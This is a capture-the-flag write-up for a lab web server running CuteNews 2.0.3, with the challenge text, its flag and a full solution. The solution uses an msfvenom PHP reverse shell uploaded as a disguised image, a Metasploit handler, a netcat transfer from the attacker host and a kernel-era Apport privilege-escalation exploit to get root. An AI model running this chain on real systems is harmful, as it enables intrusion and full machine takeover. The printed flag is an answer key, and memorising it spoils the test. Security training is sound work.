# Cute Problems
200

You have access to the Acme Corp Jira board, and noticed there is a ticket to fix a vulnerability with the web app at 192.168.x.7.

Why not offer them a free pentest? Show off your skills by getting root on the machine and capturing the flag. Maybe a job offer will follow?

Notes to players, adjust the 3rd octet to reflect your team's address space.

# Flag
```
RTXFLAG{best_avatar_ever}
```

# Solution
Port 80 is open. 
```
$ sudo nmap -n -O 192.168.5.7                                                                                                                                                                             1 ⨯
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-12 00:57 EDT
Nmap scan report for 192.168.5.7
Host is up (0.00032s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:50:56:B8:DF:B3 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
```

Taking a look - it's a login page. There is a link to register as a new user. Also - it's powered by something called CuteNews 2.0.3. What is this? It's an old version that is vulnerable. [https://www.exploit-db.com/exploits/37474](https://www.exploit-db.com/exploits/37474)

The exploit relies on file upload. To take advantage, we need to be a user. Let see if we can register? Why yes, we can. Let's create a reverse shell using msfvenom
```
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.5.101 LPORT=9898 -f raw > shell.jpg
```

Then, using burpsuite proxy to intercept the file upload. Rename the .jpg to .php and forward.

Next - in metasploit, set up the shell handler
```
$ msfconsole 
...
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.5.101
msf6 exploit(multi/handler) > set lport 9898
msf6 exploit(multi/handler) > exploit
```

Now, go to the /uploads site and click on the link to the reverse shell. Hopefully back in metasploit we have a shell.
```
meterpreter > ls
Listing: /var/www/html/uploads
==============================

Mode         Size  Type  Last modified       Name
----         ----  ----  -------------       ----
100644/rw-r  1114  fil   2021-09-12 01:21:0  avatar_user1_shell.
--r--                    9 -0400             php
```

Spent some time digging into the files on the website. It uses a flat-file system (instead of a database). There is one user with some sudo privs - so I thought that if I could find this users password, I could run some code to get root. While there are some password hashes in the /cdata/users directory - none for the user of interest.

So, started looking that the linux box itself.
```
uname -a
Linux WebServer1.acmecorp.local 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
```

Oh - wow - that's a bit out of date

This could be an approach - [https://or10nlabs.tech/vulnhub-simple/](https://or10nlabs.tech/vulnhub-simple/)

So on my host
```
$ searchsploit linux | grep Ubuntu | grep 14.04
Apport (Ubuntu 14.04/14.10/15.0 | linux/local/37088.c
Apport 2.14.1 (Ubuntu 14.04.2)  | linux/local/36782.sh
Linux Kernel (Ubuntu 14.04.3) - | linux/local/39771.txt
Linux Kernel 3.x (Ubuntu 14.04  | linux/local/41999.txt
NetKit FTP Client (Ubuntu 14.04 | linux/dos/37777.txt
Ubuntu 14.04/15.10 - User Names | linux/local/41762.txt
WebKitGTK 2.1.2 (Ubuntu 14.04)  | linux/local/44204.md
```

And taking the first entry
```
$ cp /usr/share/exploitdb/exploits/linux/local/37088.c 37088.c
```
Now start a nc session to transfer the file,
```
nc -nlvp 31337 < 37088.c
```

and on the target, grab the file:
```
nc 192.168.5.101 31337 > /tmp/37088.c
```

give it a sec to transfer and then close the host;

Back on the target, lets compile and run the code:
```
cd tmp
gcc 37088.c -o 37088
./37088
```

and Profit! we have root.
```
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -la /root
total 24
drwx------  2 root root 4096 Aug 24 17:20 .
drwxr-xr-x 21 root root 4096 Jan 16  2019 ..
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1442 Aug 24 17:20 .viminfo
-rw-------  1 root root   26 Aug 24 17:20 flag.txt
# cat /root/flag.txt
RTXFLAG{best_avatar_ever}
```
